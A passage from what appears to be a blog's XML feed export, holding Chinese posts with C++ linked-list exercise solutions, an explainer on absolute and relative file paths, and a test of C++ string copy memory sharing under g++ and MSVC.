            curNode <span class="token operator">=</span> curNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            head1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
            head2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>head1<span class="token operator">-></span>val <span class="token operator">></span> head2<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            head2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            head1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> head3<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="两链表的交集"><a href="#两链表的交集" class="headerlink" title="两链表的交集"></a>两链表的交集</h1><h2 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知两个带头节点的单链表 A 和 B 分别表示两个集合，其元素递增排列且无重复元素。编制函数，求 A 和 B 的交集，存放于 A 链表中，并释放多余的结点。</p>
<h2 id="解题代码-11"><a href="#解题代码-11" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">listIntersection</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> head2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> curNode1 <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> curNode2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> preNode <span class="token operator">=</span> head1<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> curNode2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>curNode1<span class="token operator">-></span>val <span class="token operator">==</span> curNode2<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            preNode<span class="token operator">-></span>next <span class="token operator">=</span> curNode1<span class="token punctuation">;</span>
            preNode <span class="token operator">=</span> preNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            curNode1 <span class="token operator">=</span> curNode1<span class="token operator">-></span>next<span class="token punctuation">;</span>
            ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> curNode2<span class="token punctuation">;</span>
            curNode2 <span class="token operator">=</span> curNode2<span class="token operator">-></span>next<span class="token punctuation">;</span>
            <span class="token keyword">delete</span> tempNode<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>curNode1<span class="token operator">-></span>val <span class="token operator">></span> curNode2<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> curNode2<span class="token punctuation">;</span>
            curNode2 <span class="token operator">=</span> curNode2<span class="token operator">-></span>next<span class="token punctuation">;</span>
            <span class="token keyword">delete</span> tempNode<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> curNode1<span class="token punctuation">;</span>
            curNode1 <span class="token operator">=</span> curNode1<span class="token operator">-></span>next<span class="token punctuation">;</span>
            <span class="token keyword">delete</span> tempNode<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 释放剩余结点</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> curNode1<span class="token punctuation">;</span>
        curNode1 <span class="token operator">=</span> curNode1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">delete</span> tempNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> curNode2<span class="token punctuation">;</span>
        curNode2 <span class="token operator">=</span> curNode2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">delete</span> tempNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    preNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="判断连续子序列"><a href="#判断连续子序列" class="headerlink" title="判断连续子序列"></a>判断连续子序列</h1><h2 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h2><p>两个整数序列 A = a1, a2, a3, …, am 和 B = b1, b2, b3, …, bn 已经存入两个带头结点单链表中，设计一个算法，判断序列 B 是否是序列 A 的连续子序列。</p>
<h2 id="解题代码-12"><a href="#解题代码-12" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">isSubsequence</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> head2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> startNode <span class="token operator">=</span> head1<span class="token operator">-></span>next<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> curNode1 <span class="token operator">=</span> startNode<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> curNode2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> curNode2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>curNode1<span class="token operator">-></span>val <span class="token operator">==</span> curNode2<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            curNode1 <span class="token operator">=</span> curNode1<span class="token operator">-></span>next<span class="token punctuation">;</span>
            curNode2 <span class="token operator">=</span> curNode2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            startNode <span class="token operator">=</span> startNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
            curNode1 <span class="token operator">=</span> startNode<span class="token punctuation">;</span>
            curNode2 <span class="token operator">=</span> head2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> curNode2 <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="判断链表环路"><a href="#判断链表环路" class="headerlink" title="判断链表环路"></a>判断链表环路</h1><h2 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h2><p>单链表有环，是指单链表的最后一个结点的指针指向了链表的某个结点（通常单链表的最后一个结点的指针域是空的）。试编写算法判断不带头结点的单链表是否存在环。</p>
<h2 id="解题代码-13"><a href="#解题代码-13" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">hasCycle</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    unordered_set<span class="token operator">&lt;</span>ListNode<span class="token operator">*</span><span class="token operator">></span> nodeSet<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nodeSet<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        nodeSet<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>
        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="快慢指针"><a href="#快慢指针" class="headerlink" title="快慢指针"></a>快慢指针</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">hasCycle</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">||</span> head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    ListNode<span class="token operator">*</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span> <span class="token comment">// 每次走一步</span>
    ListNode<span class="token operator">*</span> fast <span class="token operator">=</span> head<span class="token punctuation">;</span> <span class="token comment">// 如果可能，每次走两步</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>slow <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> fast <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        slow <span class="token operator">=</span> slow<span class="token operator">-></span>next<span class="token punctuation">;</span>
        fast <span class="token operator">=</span> fast<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fast <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            fast <span class="token operator">=</span> fast<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="查找倒数第k个结点"><a href="#查找倒数第k个结点" class="headerlink" title="查找倒数第k个结点"></a>查找倒数第k个结点</h1><h2 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知一个带有头结点的单链表，在不改变链表的前提下，请设计一个尽可能高效的算法，查找链表中倒数第 k 个位置的结点（k 为正整数）。若查找成功，算法输出该结点的值，并返回 1；否则，只返回 0.</p>
<h2 id="解题代码-14"><a href="#解题代码-14" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">lastKthNode</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> curNode1 <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token comment">// 先将curNode1移动到第k个结点</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span>curNode1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            curNode1 <span class="token operator">=</span> curNode1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    ListNode<span class="token operator">*</span> curNode2 <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token comment">// 当curNode1到达末尾，curNode2位于倒数第k个结点</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        curNode1 <span class="token operator">=</span> curNode1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        curNode2 <span class="token operator">=</span> curNode2<span class="token operator">-></span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    cout <span class="token operator">&lt;&lt;</span> curNode2<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="重排链表"><a href="#重排链表" class="headerlink" title="重排链表"></a>重排链表</h1><h2 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h2><p>设线性表 L = (a1, a2, a3, …, an-2, an - 1, an) 采用带头结点的单链表保存，请设计一个空间复杂度为 O(1) 且时间上尽可能高效的算法，重新排列 L 中的各结点，得到线性表 L’ = (a1, an, a2, an - 1, a3, an - 2, …)。</p>
<h2 id="解题代码-15"><a href="#解题代码-15" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 中间结点</span>
ListNode<span class="token operator">*</span> <span class="token function">middleNode</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> fast <span class="token operator">=</span> head<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        slow <span class="token operator">=</span> slow<span class="token operator">-></span>next<span class="token punctuation">;</span>
        fast <span class="token operator">=</span> fast<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fast<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            fast <span class="token operator">=</span> fast<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> slow<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 反转链表</span>
ListNode<span class="token operator">*</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> preNode <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> curNode <span class="token operator">=</span> head<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>curNode <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> tempNode <span class="token operator">=</span> curNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
        curNode<span class="token operator">-></span>next <span class="token operator">=</span> preNode<span class="token punctuation">;</span>
        preNode <span class="token operator">=</span> curNode<span class="token punctuation">;</span>
        curNode <span class="token operator">=</span> tempNode<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> preNode<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 归并链表</span>
<span class="token keyword">void</span> <span class="token function">mergeList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> l1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> l2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> l2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ListNode<span class="token operator">*</span> l1Next <span class="token operator">=</span> l1<span class="token operator">-></span>next<span class="token punctuation">;</span>
        ListNode<span class="token operator">*</span> l2Next <span class="token operator">=</span> l2<span class="token operator">-></span>next<span class="token punctuation">;</span>
        l1<span class="token operator">-></span>next <span class="token operator">=</span> l2<span class="token punctuation">;</span>
        l1 <span class="token operator">=</span> l1Next<span class="token punctuation">;</span>
        l2<span class="token operator">-></span>next <span class="token operator">=</span> l1<span class="token punctuation">;</span>
        l2 <span class="token operator">=</span> l2Next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 重排链表</span>
<span class="token keyword">void</span> <span class="token function">reorderList</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ListNode<span class="token operator">*</span> l1 <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> mid <span class="token operator">=</span> <span class="token function">middleNode</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ListNode<span class="token operator">*</span> l2 <span class="token operator">=</span> mid<span class="token operator">-></span>next<span class="token punctuation">;</span>
    mid<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    l2 <span class="token operator">=</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mergeList</span><span class="token punctuation">(</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>文件路径的表示方法</title>
    <url>/2021/05/16/%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>文件路径作为计算机基础内容，在很多时候都扮演着十分重要的角色，例如控制台命令、资源文件的存放等等，以下将介绍计算机文件路径的表示方法以及一些常见的使用场景。</p>
<span id="more"></span>

<p>文件路径的表示分为两种方式：绝对路径表示法和相对路径表示法。</p>
<h1 id="绝对路径与相对路径的区别"><a href="#绝对路径与相对路径的区别" class="headerlink" title="绝对路径与相对路径的区别"></a>绝对路径与相对路径的区别</h1><h2 id="绝对路径的表示"><a href="#绝对路径的表示" class="headerlink" title="绝对路径的表示"></a>绝对路径的表示</h2><p>绝对路径顾名思义就是文件在硬盘上存储的真正路径，它不会被更改，除非文件在硬盘中的位置发生改变。绝对路径表示格式为：“&lt;硬盘符&gt;\&lt;目录1&gt;\&lt;目录2&gt;…\&lt;文件名&gt;”，例如test.txt文件存储在C盘cat1下的cat2的cat3中，它用绝对路径表示为<code>C:\cat1\cat2\test.txt</code>。</p>
<h2 id="相对路径的表示"><a href="#相对路径的表示" class="headerlink" title="相对路径的表示"></a>相对路径的表示</h2><p>相对路径表示从当前文件位置出发，指向目标文件的路径，它是目标文件与当前文件的相对位置，会随着当前文件位置的不同而使与同一文件的相对位置发生改变。相对路径的表示格式为：“./&lt;目录1&gt;/&lt;目录2&gt;…/&lt;文件名&gt;”（这里的“./”可以省略），例如当前HTML文件root.html位于C盘根目录下，text.txt文件存储在C盘cat1文件夹下的cat2文件夹中，要想在root.html中引用text.txt则用相对路径表示为<code>cat1/cat2/test.txt</code>（“./”已省略）。</p>
<p>如果想要表示当前文件上级目录的文件，可以使用“../”来表示，还是上面的例子，假如我们要在test.txt文件下用相对路径表示root.html，则可以表示为<code>../../root.html</code>。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>不同盘符间的文件不能用相对路径来表示，例如位于C盘下的文件无法使用相对路径来表示D盘中的文件，其实可以这么来理解：<strong>所谓相对路径，就是相对非根目录的某个目录的绝对路径</strong>。</li>
<li>绝对路径不同目录间既可以用“\”也可以用“/”来分隔，而相对路径只能用“/”，这里推荐表示绝对路径时使用“\”，可以为两种表示方法做一个很好的区分。</li>
</ol>
<h1 id="常见使用场景"><a href="#常见使用场景" class="headerlink" title="常见使用场景"></a>常见使用场景</h1><h2 id="控制台命令”cd”"><a href="#控制台命令”cd”" class="headerlink" title="控制台命令”cd”"></a>控制台命令”cd”</h2><p>“cd”命令可以更改执行控制台命令的目录，这个目录既可以用绝对路径表示也可以用相对路径表示，但是无论哪种路径表示都只能更改为初始盘符中的目录，也就是系统盘目录。</p>
<p><img src="/2021/05/16/%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/cd-no.png"></p>
<p>如果要更改执行目录为其他盘符下的目录，可以先输入“&lt;硬盘符&gt;”，比方说要切换到上图试图切换的目录，可以先输入<code>D:</code>，然后再选择绝对路径。</p>
<p><img src="/2021/05/16/%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/cd-yes.png"></p>
<h2 id="程序中资源的引用"><a href="#程序中资源的引用" class="headerlink" title="程序中资源的引用"></a>程序中资源的引用</h2><p>如果想要在编写的程序中引用外部资源文件（图片、音频等等），则<strong>必须要用相对路径</strong>，除非你编写的程序只需要在你当前设备上运行。因为你的程序往往放在一个大的文件夹当中，当这个大的文件夹被放置在计算机不同目录下时，资源文件的绝对路径也不相同，而源代码与资源文件之间的相对位置则是保持不变的，这保证了只要用户不刻意的去改变资源文件的存放位置，那么不管整个文件夹被放置在何处，资源文件都能被正常的引用。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>文件</tag>
        <tag>Windows10</tag>
      </tags>
  </entry>
  <entry>
    <title>有关C++字符串拷贝的一个小问题</title>
    <url>/2023/04/04/%E6%9C%89%E5%85%B3C++%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%B7%E8%B4%9D%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>最近面试被问到了一个 C++ 中的小问题，就是如果有字符串 s1 和 s2，将 s1 赋值给 s2 后，它们的内存分布是什么样的。当时感觉可能是共享的，但也不太确定，回来后查阅资料发现结果并不是那么简单。</p>
<span id="more"></span>

<h1 id="查阅资料"><a href="#查阅资料" class="headerlink" title="查阅资料"></a>查阅资料</h1><p>首先是询问 chatGPT 得到的答案，如下：</p>
<blockquote>
<p>如果两个 <code>string</code> 对象存储相同的字符串，它们可能会共享同一个内存块，也可能会分别分配自己的内存块。当一个 <code>string</code> 对象被创建时，它会分配一个新的内存块，并将字符串复制到该内存块中。当第二个 <code>string</code> 对象被创建时，它可能会使用与第一个 <code>string</code> 对象相同的内存块，也可能会分配一个新的内存块并将字符串复制到该内存块中。</p>
</blockquote>
<h1 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h1><p>看来又是一个没有标准解决方案的问题，于是我编写了一个简单的程序用来在不同的环境下测试。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token keyword">operator</span> <span class="token keyword">new</span><span class="token punctuation">(</span>size_t count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Allocate "</span> <span class="token operator">&lt;&lt;</span> count <span class="token operator">&lt;&lt;</span> <span class="token string">" Bytes"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">malloc</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	string s1 <span class="token operator">=</span> <span class="token string">"Hello World"</span><span class="token punctuation">;</span>
	string s2 <span class="token operator">=</span> s1<span class="token punctuation">;</span>

	cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s2<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	s2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'h'</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s2<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在上面的程序中，我重载了  <code>operator new</code> 函数来追踪内存的分配，然后先初始化字符串 s1，然后再将 s1 作为 s2 的初始值进行赋值，输出 s1 和 s2 字符串的地址是否是同一块，即内存是否共享，然后我再修改 s2 的首字母（之所以这么做是因为修改 s2 后，由于 s1 与 s2 要保持独立性，因此如果之前内存是共用的，那么在修改之前必定需要为 s2 重新分配内存，否则改变 s2 后 s1 也将改变），再输出查看 s1 和 s2 字符串的地址是否相同。</p>
<p>以下是在不同编译器下程序运行的结果：</p>
<h2 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h2><p><img src="/2023/04/04/%E6%9C%89%E5%85%B3C++%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%B7%E8%B4%9D%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/gpp.png"></p>
<h2 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h2><p><img src="/2023/04/04/%E6%9C%89%E5%85%B3C++%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%B7%E8%B4%9D%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/msvc.png"></p>
<p>在 g++ 下未对字符串进行更改时，s1 和 s2 共用一块内存空间，而在修改前才为 s2 分配内存空间。而在 MSVC 下 s1 和 s2 始终没有共用内存空间。可见不同编译器对此情况的处理不尽相同。</p>
